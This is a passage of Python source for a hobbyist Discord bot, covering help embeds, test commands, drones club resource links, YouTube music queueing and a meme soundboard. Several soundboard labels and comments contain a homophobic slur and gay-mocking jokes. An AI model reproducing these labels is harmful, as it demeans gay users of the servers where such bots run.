        description = "**These are commands that relate to voice channel soundboard features of MagmaBot**\n\nJoin VC: **mag join**\nLeave VC: **mag leave**\nAirhorn: **mag sb airhorn**\nAli-a intro: **mag sb alia**\nBegone thot: **mag sb begonethot**\nDamn son where'd you find this: **mag sb damnson**\nDankstorm: **mag sb dankstorm**\nDeez nuts: **mag sb deeznuts**\nDeja Vu: **mag sb dejavu**\nLook at this dude: **mag sb dis_dude**\nAnother fag left the chat: **mag sb fleft**\nFart: **mag sb fart**\nHah gaaayyy: **mag sb hahgay**\nIt's called hentai and it's art: **mag sb henart**\nIlluminati song: **mag sb illuminati**\nBitch Lasagna: **mag sb lasagna**\nLoser: **mag sb loser**\nNoob: **mag sb noob**\nOof sound: **mag sb oof**\nPickle Rick: **mag sb picklerick**\nNice: **mag sb nice**\nWhy don't we just relax and turn on the radio: **mag sb radio**\nRick roll: **mag sb rickroll**\nThis is sparta: **mag sb sparta**\nTitanic flute fail: **mag sb titanic**\nGTA V Wasted: **mag sb wasted**\nWide Putin: **mag wideputin**\nWubba lubba dub dub: **mag sb wubba**\n",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)

#HELP - GAME COMMANDS
@_help.command(aliases = ["game", "Game"])
async def _help_game(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "**Game related commands list**",
        description = "**These are commands that relate to game features of MagmaBot**\n\n8ball command: **mag 8ball (your question)**\nDice command, returns 1-6: **mag dice**\nRock Paper Scissors: **mag rps (rock, paper, or scissors)**\nMeme command: **mag meme**\n",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)

#HELP - EMOJI COMMANDS
@_help.command(aliases = ["emoji", "Emoji"])
async def _help_emoji(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "**Emoji related commadns list**",
        description = "**The commands with an $ have an auto detection feature to detect a certain keyword in your message**\n\nSo fake$: **mag fake**\nX to doubt$: **mag doubt**\nStonks$: **mag stonks**\nSimp pill$: **mag simp**\nWat: **mag wat**\nAdmin abooz: **mag abooz**\n60s Timer$: **mag timer**\nThats racist$: **mag racist**\nPolice$: **mag police**\nF-spam emoji: **mag fpsam**\nClap emoji: **mag clap**\nYou tried: **mag youtried**\nPython logo: **mag python**\nPepe pog: **mag pepepog**",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)

#HELP - MODERATION COMMANDS
@_help.command(aliases = ["mod", "Mod", "moderation", "Moderation"])
async def _help_moderation(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "**Moderation related commands list**",
        description = "**These are commands that relate to moderation features of MagmaBot, most require administrative powers**\n\nWelcome command: **mag welcome**\nDescription command: **mag description**\nBot description: **mag botdesc**\nRules: **mag rules**\nForms: **mag forms**\nEveryone announcement: **mag eping {message}**\nHere announcement: **mag hping {message}**\nFRC Notif: **frcping {message}**\nFTC Notif: **ftcping {message}**\nVEX Notif: **vexping {message}**\nDrones Notif: **dronesping {message}**\nUser ID: **mag id {tag user}**\nKick command: **mag kick (tag member, reason)**\nBan command: **mag ban (tag member, reason)**\nVotekick: **mag votekick (tag member) (reason)**\nPurge/clear chat: **mag clear (number of messages)**\nBot invite link: **mag botinvite**\nTime command: **mag time**\nHelp directory: **mag help**",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)


#ANTI-SLUR & SLUR DETECTION COMMAND


'''END OF MODERATION COMMANDS'''

'''START OF TEST-BED COMMANDS OR COMMANDS FOR TESTING'''
#NONE OF THESE COMMANDS ARE ACTUAL USEFUL COMMANDS, JUST HERE FOR TESTING


#TEST COMMAND
@client.command(aliases = ["ban", "Ban", "kick", "Kick", "mute", "Mute"])
async def _repeat(ctx):
    await ctx.reply("shut up.")


#TEST COMMAND 2
@client.command(aliases = ["website", "Website"])
async def _captswebsite(ctx):
    await asyncio.sleep(float(0.1))
    await ctx.send("Sending website...")
    await asyncio.sleep(float(1.5))
    await ctx.reply("https://Basic-Website-7.itzkiettttt.repl.co")


#TEST TO SEE WTF DISCORD.MEMBER IS
@client.command(aliases = ["dmemtest"])
async def _wtf_is_discord_member(ctx, member: discord.Member, *, user_message):
    channel = await member.create_dm()
    await channel.send(user_message)
    print(channel)
    print(member)
    print(ctx)
    await ctx.send(channel)
    await ctx.send(member)
    await ctx.send(ctx)


#TEST TO SEE IF YOU CAN SEND A MESSAGE TO USER UPON COMMAND BEING CALLED
@client.command(aliases = ["helptestcommand"])
async def _help_test_command(ctx):
    #channel = await ctx.author.create_dm()

    async def help_list_dm():
        author_name = ctx.author.display_name
        embed = discord.Embed(
            title = "Title",
            description = "Command list goes here",
            color = bot_color
        )
        embed.set_footer(text = f"Requested by {author_name}")
        #channel.send(embed = embed)
        await ctx.author.send(embed = embed)
    
    await help_list_dm()
    

'''END OF TEST-BED COMMANDS OR COMMANDS FOR TESTING'''

'''START OF DRONES ROBOTICS COMMANDS'''


@client.group(invoke_without_command = True, aliases = ["drones", "Drones", "drone", "Drone"])
async def _drones(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "**Drones commands directory**",
        description = "**Resources command:** mag drones resources\n**Drones lesson plans:** mag drones lesson\n**Drones schedule:** mag drones schedule\n\n",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)


@_drones.command(aliases = ["resources", "Resources", "resource", "Resource"])
async def _drones_resources(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "**Drones resources**",
        description = "**Drones Google Drive FOlder:** https://drive.google.com/drive/folders/1HQunoaAI2NzXdhObBQRMkMFWFIcIp-44?usp=sharing\n\n**Lesson plan:**https://docs.google.com/document/d/1xzT2_a2JLkOA48fMCJOBp2UKOylvcEnZXrQTNt84VpY/edit?usp=sharing\n\n**Pre-flight checklist:** https://docs.google.com/spreadsheets/d/1CMEKPWqM0DK6ay46B-472CXqKP4xqL_B2JoNtIOESng/edit?usp=sharing\n\n**Drones Inventory:** https://docs.google.com/spreadsheets/d/1oO5IP0Q_ZugBGxoMRwaauKX6nw6ZziOCqofEVzgQ60U/edit?usp=sharing\n\n**LiPo Battery Datasheet:** https://docs.google.com/spreadsheets/d/1NJJh621NvD2oPv99Qi7ol8usoU0AS5esArlqH0eBb0c/edit?usp=sharing\n\n**Equipment borrowing form:** https://docs.google.com/forms/d/1hpSJ9LOhGadIS-lOrPhlSDbPh38I3GRfZHs4MQJ2Ycw/edit?usp=sharing",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)


@_drones.command(aliases = ["lessons", "lesson", "Lessons", "Lesson"])
async def _drones_lessons(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "",
        description = "",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)


@_drones.command(aliases = ["schedule", "Schedule"])
async def _drones_schedule(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "",
        description = "",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)

'''START OF DRONES ROBOTICS COMMANDS'''

'''START OF MUSIC AND VOICE CHANNEL RELATED COMMANDS'''


#VOICE CHANNEL JOIN
@client.command(pass_context = True, aliases = ["Join", "join", "j", "J", "connect", "Connect"])
async def _join(ctx):
    global voice
    channel = ctx.message.author.voice.channel
    voice = get(client.voice_clients, guild = ctx.guild)

    if voice and voice.is_connected():
        await voice.move_to(channel)
        await ctx.reply("I have joined your voice channel")
        print("MagmaBot joined a voice channel")
    else:
        await channel.connect()
        await ctx.reply("I have joined your voice channel")
        print("MagmaBot joined a voice channel")


#VOICE CHANNEL LEAVE
@client.command(pass_context = True, aliases = ["Leave", "leave", "L", "l", "Disconnect", "disconnect"])
async def _leave(ctx):
    channel = ctx.message.author.voice.channel
    voice = get(client.voice_clients, guild = ctx.guild)

    if voice and voice.is_connected():
        await voice.disconnect()
        print(f"MagmaBot is disconnected from {channel} voice channel")
        await ctx.reply(f"I have left the '{channel}' voice channel")
    else:
        print("command given to leave voice channel but bot wasn't in a voice channel")
        await ctx.reply("Invalid command: the bot wasn't in any voice channels")


#VOICE CHANNEL PLAY YOUTUBE URL
@client.command(pass_context = True, aliases = ["play", "Play", "p", "P"])
async def _play(ctx, url: str):
    def check_queue():
        Queue_infile = os.path.isdir("./Queue")
        if Queue_infile is True:
            DIR = os.path.abspath(os.path.realpath("Queue"))
            length = len(os.listdir(DIR))
            still_queue = length - 1 #outprints how many are left in queue after new song is played
            try:
                first_file = os.listdir(DIR)[0] #first file inside directory
            except:
                print("No more songs left in queue\n")
                queues.clear
                return
            main_location = os.path.dirname(os.path.realpath(__file__))
            song_path = os.path.abspath(os.path.realpath("Queue") + "//" + first_file)
            
            if length != 0:
                print("Song finished playing, loading next song\n")
                print(f"Number of songs still in queue: {still_queue}")
                is_song_there = os.path.isfile("song.mp3")
                if is_song_there: 
                    os.remove("song.mp3")
                shutil.move(song_path, main_location) #moves queued song to main directory
                for file in os.listdir("./"):
                    if file.endswith(".mp3"):
                        os.rename(file, "song.mp3")
                vcvoice.play(discord.FFmpegPCMAudio("song.mp3"), after = lambda e: check_queue()) #plays the song
                vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
                vcvoice.source.value = 0.05
            
            else: #if queues = 0, clearns it
                queues.clear()
                return

        else: #is there is no queue folder
            queues.clear()
            print("No songs queued after the last song\n")

    #end of queue section thingy for play command
    is_song_there = os.path.isfile("song.mp3")
    try: #code will try to remove song, if it's playing then no remove
        if is_song_there:
            os.remove("song.mp3")
            queues.clear()
            print("Removed an old song file")
    except PermissionError:
        print("Failed to remove song file, song file in use")
        ctx.reply("Error: song file cannot be removed because it's currently playing")
        return

    #this section is here to remove the old queue folder
    Queue_infile = os.path.isdir("./Queue")
    try:
        Queue_folder = "./Queue"
        if Queue_infile is True:   #if there is an old queue file, it will try to remove it
            print("Removed old queue folder")
            shutil.rmtree(Queue_folder)
    except:
        print("No old queue folder")

    #rest of play command to play songs
    await ctx.reply("Getting everything ready to play, this may take a bit to load")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    ydl_opts = {
        "format": "bestaudio/best",
        "postprocessors": [{
            "key": "FFmpegExtractAudio",
            "preferredcodec": "mp3",
            "preferredquality": "512",
        }], #code above to specify options in ydl
    }
    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        print("Downloaded audio file\n")
        ydl.download([url])
    #renames file name 
    for file in os.listdir("./"): #./ for current directory
        if file.endswith(".mp3"):
            audio_file_name = file
            print(f"Renamed File {file}\n")
            os.rename(file, "song.mp3")
    #checks to see if audio has finished playing, after then it will print
    vcvoice.play(discord.FFmpegPCMAudio("song.mp3"), after = lambda e: check_queue())
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05
    new_name = audio_file_name.rsplit("-", 2)
    await ctx.reply(f"Now Playing {new_name}")
    print("playing\n")


#VOICE CHANNEL MUSIC PAUSE COMMAND
@client.command(pass_context = True, aliases = ["pause", "Pause"])
async def _pause(ctx):
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    
    if vcvoice and voice.is_playing():
        vcvoice.pause()
        print("Music paused")
        await ctx.reply("Music paused")
    else:
        print("Music wasn't playing but there was a request to pause music")
        await ctx.reply("There was no music wasn't playing so i can't pause it")


#VOICE CHANNEL MUSIC RESUME COMMAND
@client.command(pass_context = True, aliases = ["resume", "Resume"])
async def _resume(ctx):
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    
    if vcvoice and voice.is_paused():
        vcvoice.resume()
        print("Music resumed")
        await ctx.reply("Music has been resumed pogs")
    else:
        print("Music was not paused but a request was sent for music pause")
        await ctx.reply("Music was playing, can't be resumed if it wasn't paused")


#VOICE CHANNEL MUSIC STOP COMMAND
@client.command(pass_context = True, aliases = ["stop", "Stop"])
async def _stop(ctx):
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)

    queues.clear() #clears queue when stop command ran

    if vcvoice and voice.is_playing():
        vcvoice.stop()
        print("Music stopped")
        await ctx.reply("Music stopped")
    else:
        print("Music could not be stopped")
        await ctx.reply("Music can't be stopped if there isn't music playing")


#VOICE CHANNEL MUSIC QUEUE
#this command is for music to be queued up if you use the "mag play" multiple times while music is still playing
queues = {}

@client.command(pass_context = True, aliases = ["Queue", "queue", "Q", "q"])
async def _queue(ctx, url: str):
    Queue_infile = os.path.isdir("./Queue")
    if Queue_infile is False:
        os.mkdir("Queue")      #sees if there is any song files in queue, if there is any then it counts them
    DIR = os.path.abspath(os.path.realpath("Queue"))
    queue_num = len(os.listdir(DIR)) #gets/counts ammount of files in the queue
    queue_num += 1 #adds another to queue
    add_queue = True
    while add_queue:
        if queue_num in queues:
            queue_num += 1
        else:
            add_queue = False
            queues[queue_num] = queue_num

    queue_path = os.path.abspath(os.path.realpath("Queue") + f"//song{queue_num}.%(ext)s")
    #takes the real path of song in queue and number of it
    ydl_opts = {
        "format": "bestaudio/best",
        "outtmpl" : queue_path,
        "postprocessors": [{
            "key": "FFmpegExtractAudio",
            "preferredcodec": "mp3",
            "preferredquality": "512",
        }], #code above to specify options in ydl
    }
    #downloads song and puts into queue path above ^
    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        print("Downloaded audio file\n")
        ydl.download([url])
    await ctx.reply("Adding song " + str(queue_num) + " to the queue")
    print("added a song to queue\n")


'''END OF MUSIC AND VOICE CHANNEL RELATED COMMANDS'''

'''START OF VOICE CHANNEL SOUNDBOARD COMMANDS'''


#old soundboard command, this is a singular command and doesn't rely on groups and subcommands
'''
@client.command(pass_context = True, aliases = ["airhorn", "Airhorn"])
async def _soundboard_airhorn(ctx):
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/airhorn.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05
'''

#soundboard command format; copy for future use, switch out airhorn with whatever, 2nd one already has that done
'''
@_soundboard.command(aliases = ["airhorn", "Airhorn"])
async def _soundboard_airhorn(ctx):
    await ctx.send("Playing **airhorn** sound effect from soundboard")
    print("\nPlayed airhorn sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/airhorn.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

@_soundboard.command(aliases = [""])
async def _soundboard_(ctx):
    await ctx.send("Playing **** sound effect from soundboard")
    print("\nPlayed  sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05
'''


#SOUNDBOARD COMMAND GROUP & HELP
@client.group(invoke_without_command = True, aliases = ["sb", "SB", "soundboard", "Soundboard", "SoundBoard"])
async def _soundboard(ctx):
    author_name = ctx.author.display_name
    embed = discord.Embed(
        title = "**Soundboard commands list**",
        description = "**These are commands that relate to voice channel soundboard features of MagmaBot**\n\nJoin VC: **mag join**\nLeave VC: **mag leave**\nAirhorn: **mag sb airhorn**\nAli-a intro: **mag sb alia**\nBegone thot: **mag sb begonethot**\nDamn son where'd you find this: **mag sb damnson**\nDankstorm: **mag sb dankstorm**\nDeez nuts: **mag sb deeznuts**\nDeja Vu: **mag sb dejavu**\nLook at this dude: **mag sb dis_dude**\nAnother fag left the chat: **mag sb fleft**\nFart: **mag sb fart**\nHah gaaayyy: **mag sb hahgay**\nIt's called hentai and it's art: **mag sb henart**\nIlluminati song: **mag sb illuminati**\nBitch Lasagna: **mag sb lasagna**\nLoser: **mag sb loser**\nNoob: **mag sb noob**\nOof sound: **mag sb oof**\nPickle Rick: **mag sb picklerick**\nNice: **mag sb nice**\nWhy don't we just relax and turn on the radio: **mag sb radio**\nRick roll: **mag sb rickroll**\nThis is sparta: **mag sb sparta**\nTitanic flute fail: **mag sb titanic**\nGTA V Wasted: **mag sb wasted**\nWide Putin: **mag wideputin**\nWubba lubba dub dub: **mag sb wubba**\n",
        color = bot_color
    )
    embed.set_footer(text = f"Requested by {author_name}")
    await ctx.send(embed = embed)


#SB AIRHORN 
@_soundboard.command(aliases = ["airhorn", "Airhorn"])
async def _soundboard_airhorn(ctx):
    await ctx.reply("Playing **airhorn** sound effect from soundboard")
    print("\nPlayed airhorn sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/airhorn.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB ALI-A SOUNDTRACK
@_soundboard.command(aliases = ["ali_a", "alia", "Ali-a", "Alia"])
async def _soundboard_ali_a(ctx):
    await ctx.reply("Playing **ali_a** sound effect from soundboard")
    print("\nPlayed ali_a sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/ali_a.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB BEGONE THOT
@_soundboard.command(aliases = ["begone_thot", "begonethot", "Begone_thot", "Begonethot"])
async def _soundboard_begone_thot(ctx):
    await ctx.reply("Playing **begone_thot** sound effect from soundboard")
    print("\nPlayed begone_thot sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/begone_thot.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB DAMN SON WHERE'D U FIND THIS
@_soundboard.command(aliases = ["damn_son", "Damn_son", "damnson", "Damnson"])
async def _soundboard_damn_son(ctx):
    await ctx.reply("Playing **damn_son** sound effect from soundboard")
    print("\nPlayed damn_son sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/damn_son.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB DANKSTORM
@_soundboard.command(aliases = ["dankstorm", "Dankstorm"])
async def _soundboard_dankstorm(ctx):
    await ctx.reply("Playing **dankstorm** sound effect from soundboard")
    print("\nPlayed dankstorm sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/dankstorm.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB DEEZNUTS
@_soundboard.command(aliases = ["deez_nuts", "deeznuts", "Deez_nuts", "Deeznuts"])
async def _soundboard_deez_nuts(ctx):
    await ctx.reply("Playing **deez_nuts** sound effect from soundboard")
    print("\nPlayed deez_nuts sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/deez_nuts.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB DEJA VU
@_soundboard.command(aliases = ["deja_vu", "dejavu", "Deja_vu", "Dejavu"])
async def _soundboard_deja_vu(ctx):
    await ctx.reply("Playing **deja_vu** sound effect from soundboard")
    print("\nPlayed deja_vu sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/deja_vu.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB LOOK AT THIS DUDE
@_soundboard.command(aliases = ["dis_dude", "this_dude", "disdude", "thisdude", "Dis_dude", "This_dude", "Disdude", "Thisdude" ])
async def _soundboard_this_dude(ctx):
    await ctx.reply("Playing **dis_dude** sound effect from soundboard")
    print("\nPlayed dis_dude sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/dis_dude.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB ANOTHER FAG LEFT THE CHAT
@_soundboard.command(aliases = ["f_left", "fleft", "F_left", "Fleft"])
async def _soundboard_f_left(ctx):
    await ctx.reply("Playing **f_left** sound effect from soundboard")
    print("\nPlayed f_left sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/f_left.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB FART
@_soundboard.command(aliases = ["fart", "Fart"])
async def _soundboard_fart(ctx):
    await ctx.reply("Playing **fart** sound effect from soundboard")
    print("\nPlayed fart sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/fart.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB HAH GAAAYY
@_soundboard.command(aliases = ["hah_gay", "hahgay", "Hah_gay", "Hahgay"])
async def _soundboard_hah_gay(ctx):
    await ctx.reply("Playing **hah_gay** sound effect from soundboard")
    print("\nPlayed hah_gay sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/hah_gay.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB IT'S CALLED HENTAI, AND IT'S ART
@_soundboard.command(aliases = ["hen_art", "henart", "Hen_art", "Henart"])
async def _soundboard_hentai_art(ctx):
    await ctx.reply("Playing **henart (hentai art)** sound effect from soundboard")
    print("\nPlayed henart sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/hen_art.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB ILLUMINATI X-FILES SOUNDTRACK
@_soundboard.command(aliases = ["illuminati", "Illuminati"])
async def _soundboard_illuminati(ctx):
    await ctx.reply("Playing **illuminati** sound effect from soundboard")
    print("\nPlayed illuminati sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/illuminati.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB BITCH LASAGNA
@_soundboard.command(aliases = ["lasagna", "Lasagna", "bitch_lasagna", "Bitch_lasagna"])
async def _soundboard_bitch_lasagna(ctx):
    await ctx.reply("Playing **bitch_lasagna** sound effect from soundboard")
    print("\nPlayed bitch_lasagna sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/lasagna.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB LOOSER
@_soundboard.command(aliases = ["looser", "Looser", "loser", "Loser"])
async def _soundboard_loser(ctx):
    await ctx.reply("Playing **loser** sound effect from soundboard")
    print("\nPlayed loser sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/loser.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB NOOB 
@_soundboard.command(aliases = ["noob", "Noob"])
async def _soundboard_noob(ctx):
    await ctx.reply("Playing **noob** sound effect from soundboard")
    print("\nPlayed noob sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/noob.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB OOF SOUND
@_soundboard.command(aliases = ["oof", "Oof"])
async def _soundboard_oof(ctx):
    await ctx.reply("Playing **oof** sound effect from soundboard")
    print("\nPlayed oof sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/oof.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB I'M PICKLE RICKKKK
@_soundboard.command(aliases = ["pickle_rick", "Pickle_rick", "picklerick", "Picklerick"])
async def _soundboard_pickcle_rick(ctx):
    await ctx.reply("Playing **pickle_rick** sound effect from soundboard")
    print("\nPlayed pickle_rick sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/pickle_rick.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB *POP* NICE  
@_soundboard.command(aliases = ["nice", "Nice"])
async def _soundboard_nice(ctx):
    await ctx.reply("Playing **nice** sound effect from soundboard")
    print("\nPlayed nice sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/nice.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB WHY DON'T WE JUST RELAX, TURN ON THE RADIO, WOULD YOU LIKE AM OR FM
@_soundboard.command(aliases = ["radio", "Radio"])
async def _soundboard_radio(ctx):
    await ctx.reply("Playing **radio** sound effect from soundboard")
    print("\nPlayed radio sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/radio.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB RICKROLL
@_soundboard.command(aliases = ["rick_roll", "Rick_roll", "rickroll", "Rickroll"])
async def _soundboard_rick_roll(ctx):
    await ctx.reply("Playing **rick_roll** sound effect from soundboard")
    print("\nPlayed rick_roll sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/rick_roll.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB SPARTA
@_soundboard.command(aliases = ["sparta", "Sparta"])
async def _soundboard_sparta(ctx):
    await ctx.reply("Playing **sparta** sound effect from soundboard")
    print("\nPlayed sparta sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/sparta.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB TITANIC FLUTE MEME
@_soundboard.command(aliases = ["titanic", "Titanic"])
async def _soundboard_titanic(ctx):
    await ctx.reply("Playing **titanic** sound effect from soundboard")
    print("\nPlayed titanic sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/titanic.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB GTAV WASTED SOUND
@_soundboard.command(aliases = ["wasted", "Wasted"])
async def _soundboard_wasted(ctx):
    await ctx.reply("Playing **wasted** sound effect from soundboard")
    print("\nPlayed wasted sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/wasted.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#WIDE PUTIN SONG
@_soundboard.command(aliases = ["wideputin", "Wideputin"])
async def _soundboard_wideputin(ctx):
    await ctx.reply("Playing **wideputin** sound effect from soundboard")
    print("\nPlayed wideputin sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/wideputin.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05

#SB RICK & MORTY WUBBA LUBBA DUB DUB
@_soundboard.command(aliases = ["wubba", "Wubba"])
async def _soundboard_wubba(ctx):
    await ctx.reply("Playing **wubba** sound effect from soundboard")
    print("\nPlayed wubba sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/wubba.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05


#SB ANIME THIGHS
@_soundboard.command(aliases = ["animethighs", "Animethighs"])
async def _soundboard_animethighs(ctx):
    await ctx.reply("Playing **anime thighs** sound effect from soundboard")
    print("\nPlayed animethighs sound effect\n")
    vcvoice = discord.utils.get(client.voice_clients, guild = ctx.guild)
    vcvoice.play(discord.FFmpegPCMAudio("soundboard/animethighs.mp3"))
    vcvoice.source = discord.PCMVolumeTransformer(vcvoice.source)
    vcvoice.source.value = 0.05


'''END OF VOICE CHANNEL SOUNDBOARD COMMANDS'''

'''START OF GAME RELATED COMMANDS'''


#8BALL COMMAND
@client.command(aliases=["8ball", "eightball"])
async def _8ball(ctx, *, user_question):
    author_name = ctx.author.display_name
    responses = [
        "As I see it, yes.",
        "Ask again later.",
        "Better not tell you now.",
